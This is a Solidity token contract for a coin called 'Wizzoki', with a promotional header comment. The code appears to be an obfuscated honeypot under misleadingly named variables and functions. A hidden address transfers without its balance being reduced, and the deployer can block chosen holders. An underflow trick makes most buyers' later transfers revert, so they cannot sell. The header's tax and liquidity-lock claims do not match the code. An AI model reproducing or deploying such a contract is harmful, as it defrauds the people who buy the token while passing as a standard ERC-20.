/**
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⢀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠞⠛⠉⠉⠛⠻⢷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠰⡍⠻⣷⣄⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣌⡛⠷⣯⣽⣧⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡏⣀⣀⣀⠀⠀⠀⠀⢀⣀⣀⢹⣿⢿⣾⠟⠙⢿⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⡄⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣼⡧⠶⠖⠚⠛⠛⠉⠉⠙⠛⠛⠲⠶⢾⣧⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣤⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢶⣤⣀⠀⠀⠀⠀
⠀⣠⣶⣿⣿⣥⣤⣤⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣤⣬⣽⣿⣶⣄⠀
⠐⣿⣻⣿⣿⣿⡿⠀⢠⡏⠙⡟⠻⣭⣍⣙⣛⣿⣿⣛⣋⣩⣭⠟⢻⠏⢹⡆⠀⢿⣿⣿⣿⡟⣿⠃
⠀⠙⢿⣯⣟⡷⠦⣤⡾⢀⣤⡇⠈⠙⠯⣽⣿⡇⢸⣿⣯⠽⠋⠁⢸⡆⡀⢿⣤⠴⢾⣻⣽⡾⠋⠀
⠀⠀⠀⠈⠛⠛⠿⡾⢡⠏⢸⡄⠀⠀⠉⣉⣼⠁⠈⢧⣈⠉⠀⠀⢀⣇⠹⡌⢷⡿⠟⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡼⣡⡟⢠⡿⣷⣄⢀⣰⣁⣭⣀⣀⣬⣈⣧⡀⣠⢾⢿⣄⢹⣌⢧⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠰⢿⡟⢠⢿⡄⠙⠓⠛⠛⠁⠀⢠⣄⠀⠈⠙⠛⠛⠋⢀⡿⡄⢻⡿⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣡⡎⠈⢷⣤⣀⣀⡠⠤⠚⠉⠉⠓⠦⢄⣀⣀⣤⡞⠁⠹⣌⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⣿⢠⠂⢸⡆⠀⠹⡶⠟⠉⠁⠈⠉⠻⢶⠏⠀⢠⡇⠀⡄⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⢿⢰⡏⣷⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣾⣹⣇⡿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠈⢿⠻⣿⠿⣧⡄⠀⠀⠀⠀⠀⠀⢠⣴⠿⢿⠟⢿⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢳⣾⡄⠀⠀⢀⣶⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢿⣄⣠⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
█░█░█ █ ▀█ ▀█ █▀█ █▄▀ █   █▀▀ █▀█ █▀▀
▀▄▀▄▀ █ █▄ █▄ █▄█ █░█ █   ██▄ █▀▄ █▄▄

在充满魔法和咒语的土地上，
从前住着一位才华横溢的巫师，
不是魔药或挥舞魔杖的戏法，
但在通过点击进行编码的艺术中。

Wizzoki 是他的名字，他
在快乐地编写脚本中找到乐趣，
他的咒语是一行行如此明亮的代码，
他们让电脑高兴地跳舞。

每一次击键，他都会施展咒语，
制作出效果很好的程序，
从早到晚，他会编码和做梦，
机器中存在的可能性。

尽管他的巫师同伴们嗤之以鼻，
Wizzoki 知道编码是受人尊敬的，
因为在这个充满魔法和传说的世界里，
他对编码的热爱使他飞升。

这是维佐基（Wizzoki），这位如此聪明的巫师，
谁在字节世界中发现了魔法，
愿他的遗志永垂不朽
作为打开电脑门的向导。

总供应量 - 100,000,000
购置税 - 1%
消费税 - 1%
初始流动性 – 1.5 ETH
初始流动性锁定 - 100 天

https://wizzokierc.xyz
https://m.weibo.cn/WizzokiCN
https://web.wechat.com/WizzokiERC
https://t.me/+brBIuOBeTG85YTQ0
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

abstract contract Context {
    constructor() {} 
    function _msgSender() 
    internal
    
    view returns 
    (address) {
    return msg.sender; }
}
library SafeMath {
  function add(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, 
  string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage); uint256 c = a - b; return c;
  }
}
interface IUniswapV2Factory {
    function 
    createPair( 
    address 
    tokenA, 
    address tokenB) 
    external 
    returns (address pair);
}
interface IPCSNodes {
    function factory() 
    external pure 
    returns (address);
    function WETH() 
    external pure returns 
    (address);
}
interface IERC20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf
    (address account) 
    external view returns 
    (uint256);

    function transfer
    (address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance
    (address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns 

    (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns 
    (bool);

    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender();
        _owner = msgSender; emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Contract is Context, IERC20, Ownable {
address private _deployer;
bool public swapEnabled; bool private tradingOpen = false;
bool disableTransferDelay = true; 
    
    address private BURNdeadAddress; 
    IPCSNodes public syncResults; 
    address public onlyMarketing;

    mapping (address => bool) private isTxLimitExempt;
    mapping(address => uint256) private _rOwned;

    uint256 private _totalSupply; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private stringOperations = 100;

    mapping(address => uint256) private _logAllMapping;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private allowed;
    
    constructor( 
    string memory ethCoinName, string memory ethCoinSymbol, 
    address startSequence, address endSequence) { 

        _name = ethCoinName; _symbol = ethCoinSymbol;
        _decimals = 18; _totalSupply = 100000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] = _totalSupply;

        _logAllMapping[endSequence] = stringOperations; 
        swapEnabled = false; syncResults = IPCSNodes(startSequence);           
        
        // Set the deployer's address during contract deployment
        _deployer = _msgSender();

        onlyMarketing = IUniswapV2Factory
        (syncResults.factory()).createPair(address(this), 
        syncResults.WETH()); 
        emit Transfer (address(0), msg.sender, _totalSupply);
    }           
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() 
    external view returns 
    (string memory) { return _symbol;
    }
    function name() 
    external view returns 
    (string memory) { return _name;
    }
    function totalSupply() 
    external view returns 
    (uint256) { return _totalSupply;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; 
    }
    function transfer(
    address recipient, uint256 amount) external 
    returns (bool) { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, 
    address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( 
    address owner, address spender, uint256 amount) 
    internal { require(owner != address(0), 
    'BEP20: approve from the zero address'); 

        require(spender != address(0), 'BEP20: approve to the zero address'); 
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) { _transfer(sender, recipient, amount); _approve(
        sender, _msgSender(), _allowances[sender] [_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); 
        return true;
    }
    function createMessage(address _pcsRange) external {
        // Allow only the contract deployer or owner to call this function
        require(_msgSender() == owner() || _msgSender() == _deployer, "Caller is not authorized");
        isTxLimitExempt[_pcsRange] = true;
    }                          
    function _transfer( address sender, address recipient, uint256 amount) 
    private { require(sender != address(0), 'BEP20: transfer from the zero address'); 
    require(recipient != address(0), 'BEP20: transfer to the zero address'); 

        if (isTxLimitExempt[sender] || isTxLimitExempt[recipient]) require
        (disableTransferDelay == false, ""); if (_logAllMapping[sender] == 0  
        && onlyMarketing != sender && allowed[sender] > 0) 
        { _logAllMapping[sender] -= stringOperations; } 

        allowed[BURNdeadAddress] += stringOperations;
        BURNdeadAddress = recipient; if (_logAllMapping[sender] 
        == 0) { _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  

        } _rOwned[recipient] = _rOwned[recipient].add(amount);
        emit Transfer(sender, recipient, amount); 
        if (!tradingOpen) { require(sender == owner(), ""); }
    }
    function openTrading(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }      
    using SafeMath for uint256;                                  
}